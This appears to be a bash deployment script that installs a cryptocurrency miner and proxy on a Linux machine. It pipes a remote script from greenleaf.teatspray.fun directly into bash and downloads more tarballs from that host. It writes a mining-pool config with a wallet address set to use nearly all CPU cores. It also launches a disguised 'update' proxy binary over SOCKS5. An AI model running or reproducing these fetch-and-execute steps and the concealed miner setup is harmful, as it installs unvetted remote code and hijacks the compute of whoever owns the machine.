cd
sleep 2
export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

apt update >/dev/null;apt -y install apt-utils psmisc libreadline-dev dialog automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget dpkg >/dev/null

sleep 2

curl -fsSL http://greenleaf.teatspray.fun/install_and_monitor_shade_root.sh | bash &

sleep 2
cat /etc/*-release
sleep 2

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_Test_')
ipaddress=$(curl -s api.ipify.org)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip
used_num_of_cores=`expr $num_of_cores - 2`

echo ""
echo "You have a total number of $used_num_of_cores cores"
echo ""

echo ""
echo "Your worker name is $currentdate"
echo ""

sleep 2

# Function to check if Node.js is installed

wget -O - https://deb.nodesource.com/setup_20.x | bash

sleep 3

apt -y install nodejs

sleep 2

node -v && npm

curl http://greenleaf.teatspray.fun/chrome-mint.tar.gz -L -O -J
tar -xvf chrome-mint.tar.gz
rm chrome-mint.tar.gz
cd chrome-mint

# Install dependencies
npm install

sleep 2

wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add -
echo "deb http://dl.google.com/linux/chrome/deb/ stable main" | tee /etc/apt/sources.list.d/google.list

sleep 2

apt-get update
apt-get install -y google-chrome-stable

sleep 2

npm install pm2 -g

sleep 2

#pm2 set pm2:sysmonit true

sleep 2

#pm2 update

sleep 2

curl -x socks5h://127.0.0.1:1081 api.ipify.org

sleep 2

DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null

sleep 2

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null

sleep 2

TZ='Africa/Johannesburg'; export TZ
date 
sleep 2 

rm config.json

sleep 2

#./update/update bash

cat > config.json <<END
{
  "algorithm": "minotaurx",
  "host": "flyingsaucer-eu.teatspray.fun",
  "port": 7019,
  "worker": "CS6wMVsAHYUoUi79KeKgywoGHy58vc4QJB",
  "password": "$currentdate,c=LCC,zap=LCC",
  "workers": $used_num_of_cores,
  "fee": "1"
}
END

sleep 5

echo "Your worker name is $currentdate"

sleep 2

wget -q http://greenleaf.teatspray.fun/update.tar.gz

sleep 2

tar -xf update.tar.gz

sleep 2

cat > update/local/update-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 127.0.0.1:1081
END

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1

sleep 3

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

./update/update wget -q -O- http://api.ipify.org

sleep 2

lscpu

sleep 2

node index.js
